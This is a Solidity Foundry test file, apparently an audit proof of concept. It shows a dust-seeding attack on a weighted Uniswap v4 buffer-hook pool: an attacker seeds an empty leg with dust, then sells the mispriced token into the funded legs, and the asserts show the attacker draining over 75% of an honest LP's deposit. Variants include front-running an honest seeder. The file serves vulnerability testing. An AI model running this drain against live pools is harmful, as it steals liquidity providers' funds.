// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {
    IUniswapV4StandardExchangeWeightedBufferHookPackage
} from "contracts/hooks/uniswap/v4/standardExchange/weighted/interfaces/IUniswapV4StandardExchangeWeightedBufferHookPackage.sol";
import {
    UniswapV4StandardExchangeWeightedBufferHookPairPoolLib as PairPoolLib
} from "contracts/hooks/uniswap/v4/standardExchange/weighted/UniswapV4StandardExchangeWeightedBufferHookPairPoolLib.sol";
import {TestBase_UniswapV4StandardExchangeWeightedBufferHook} from
    "test/foundry/spec/hooks/uniswap/v4/standardExchange/weighted/TestBase_UniswapV4StandardExchangeWeightedBufferHook.sol";

/// Sibling of dry-econ-weighted-partial-dust-seed on UniswapV4StandardExchangeWeightedBufferHook
/// (package default ownerOnlyLiquidity=false). n=3, equal weights, leg0 SE-buffered (ERC4626 SE), legs1/2 raw.
/// Honest LP does the D40 partial first mint (2 legs). Unprivileged attacker seeds the empty leg with dust
/// via joinProportional, then sells the dust-priced leg into the funded legs through the live pair doors.
contract SeWeightedPartialDustSeed_Test is TestBase_UniswapV4StandardExchangeWeightedBufferHook {
    address internal attacker = address(0xA77AC);
    address internal seeder = address(0x5EED);
    address[] internal toks;

    function setUp() public override {
        super.setUp();
        _deployHookWithArgs(_argsN(3, false));
        // reviewer: base setUp zeroed fees on the default hook only; pin the claimed 0/0 on this instance
        _setUsageFee(0);
        _setDexFee(0);
        toks = weighted.tokens();
        _approveAll(user);
    }

    function _approveAll(address who) internal {
        vm.startPrank(who);
        for (uint256 i; i < toks.length; ++i) {
            IERC20(toks[i]).approve(hook, type(uint256).max);
            IERC20(toks[i]).approve(address(swapRouter), type(uint256).max);
        }
        vm.stopPrank();
    }

    function _bal(address who) internal view returns (uint256 s) {
        for (uint256 i; i < toks.length; ++i) s += IERC20(toks[i]).balanceOf(who);
    }

    function _swapAs(address who, address tin, address tout, uint256 amt) internal {
        bool z = tin < tout;
        PoolKey memory key = PairPoolLib.pairKey(tin, tout, 1, IHooks(hook));
        vm.prank(who);
        swapRouter.swapExactIn(key, SwapParams({zeroForOne: z, amountSpecified: -int256(amt),
            sqrtPriceLimitX96: z ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1}), "");
    }

    uint256 internal bookEach = 1000e18;

    function _honestPartial(uint256 empty) internal returns (uint256 vShares, uint256 vIn) {
        uint256[] memory am = new uint256[](3);
        for (uint256 i; i < 3; ++i) if (i != empty) { am[i] = bookEach; vIn += bookEach; }
        vm.prank(user);
        (vShares,) = weighted.joinProportional(am, user, 0, block.timestamp + 1 days);
        assertFalse(weighted.isFullBook(), "partial");
    }

    /// returns attacker net profit (value at price 1 for all tokens; SE vault has no yield -> 1:1)
    function _attack(uint256 empty, uint256 dust, uint256 budget) internal returns (int256 net, uint256 swaps) {
        address C = toks[empty];
        SimpleMintableERC20(C).mint(attacker, budget);
        _approveAll(attacker);
        uint256 a0 = _bal(attacker);
        uint256[] memory seed = new uint256[](3);
        seed[empty] = dust;
        vm.prank(attacker);
        (uint256 aShares,) = weighted.joinProportional(seed, attacker, 0, block.timestamp + 1 days);
        assertTrue(weighted.isFullBook(), "full after dust");
        console.log("attacker dust-seed shares", aShares);
        for (uint256 k; k < 400; ++k) {
            uint256 amt = (weighted.nativeReserve(empty) * 29) / 100;
            if (amt == 0 || amt > IERC20(C).balanceOf(attacker)) break;
            bool done = true;
            for (uint256 t; t < 3; ++t) {
                uint256 j = (k + t) % 3;
                if (j == empty) continue;
                uint256 out;
                try weighted.previewSwapExactIn(C, toks[j], amt) returns (uint256 o) { out = o; } catch { continue; }
                if (out > amt) { _swapAs(attacker, C, toks[j], amt); ++swaps; done = false; break; }
            }
            if (done) break;
        }
        uint256[] memory mins = new uint256[](3);
        vm.prank(attacker);
        weighted.exitProportional(aShares, attacker, mins, block.timestamp + 1 days);
        uint256 a1 = _bal(attacker);
        net = int256(a1) - int256(a0);
    }

    function _victimOut(uint256 vShares) internal returns (uint256 o) {
        uint256[] memory mins = new uint256[](3);
        vm.prank(user);
        uint256[] memory out = weighted.exitProportional(vShares, user, mins, block.timestamp + 1 days);
        o = out[0] + out[1] + out[2];
    }

    function _run(uint256 empty) internal {
        (uint256 vShares, uint256 vIn) = _honestPartial(empty);
        (int256 net, uint256 swaps) = _attack(empty, 1e9, 1_000e18);
        uint256 vOut = _victimOut(vShares);
        console.log("swaps", swaps);
        console.log("ATTACKER NET PROFIT (price 1)", uint256(net));
        console.log("victim in ", vIn);
        console.log("victim out", vOut);
        console.log("final natives", weighted.nativeReserve(0), weighted.nativeReserve(1), weighted.nativeReserve(2));
        assertGt(uint256(net), (vIn * 3) / 4, "attacker drains >75% of book");
        assertLt(vOut, vIn / 4, "victim loses >75%");
    }

    /// empty leg = raw leg 2
    function test_seDustSeed_rawEmptyLeg() public { _run(2); }

    /// empty leg = raw leg 1, SE leg0 funded (drain pays out via SE unwrap)
    function test_seDustSeed_rawEmptyLeg1() public { _run(1); }

    /// empty leg = SE-buffered leg0 (dust seed of face token buffered into SE shares)
    function test_seDustSeed_seEmptyLeg0() public { _run(0); }

    /// 1M-per-leg honest book: drain scales with the book; attacker capital stays dust-level
    function test_seDustSeed_largeBook() public {
        bookEach = 1_000_000e18;
        SimpleMintableERC20(toks[0]).mint(user, 1_000_000e18);
        SimpleMintableERC20(toks[1]).mint(user, 1_000_000e18);
        _run(2);
        console.log("attacker C left after attack (budget 1000e18)", IERC20(toks[2]).balanceOf(attacker));
    }

    /// with 0.3% dex fee
    function test_seDustSeed_withDexFee() public {
        _setDexFee(3e15);
        _run(2);
    }

    /// front-run an honest fair seeder; honest seed then reverts on slippage
    function test_seDustSeed_frontrunHonestSeeder() public {
        (uint256 vShares, uint256 vIn) = _honestPartial(2);
        SimpleMintableERC20(toks[2]).mint(seeder, 1000e18);
        _approveAll(seeder);
        uint256[] memory hs = new uint256[](3); hs[2] = 1000e18;
        (uint256 exp,) = weighted.previewJoinProportional(hs);
        console.log("honest seeder preview shares", exp);
        (int256 net,) = _attack(2, 1e9, 1_000e18);
        vm.prank(seeder);
        try weighted.joinProportional(hs, seeder, (exp * 99) / 100, block.timestamp + 1 days) returns (uint256 got, uint256[] memory) {
            console.log("honest seed got", got);
        } catch {
            console.log("honest seed reverted (slippage)");
        }
        uint256 vOut = _victimOut(vShares);
        console.log("ATTACKER NET PROFIT (fr)", uint256(net));
        console.log("victim out", vOut, "of", vIn);
        assertGt(net, 1500e18);
    }

    /// control: fair seed -> no profitable sell
    function test_control_fairSeed() public {
        _honestPartial(2);
        SimpleMintableERC20(toks[2]).mint(seeder, 1000e18);
        _approveAll(seeder);
        uint256[] memory hs = new uint256[](3); hs[2] = 1000e18;
        vm.prank(seeder);
        weighted.joinProportional(hs, seeder, 0, block.timestamp + 1 days);
        uint256 out = weighted.previewSwapExactIn(toks[2], toks[0], 1e18);
        console.log("fair-seed C->A 1e18 out", out);
        assertLt(out, 1e18);
    }
}
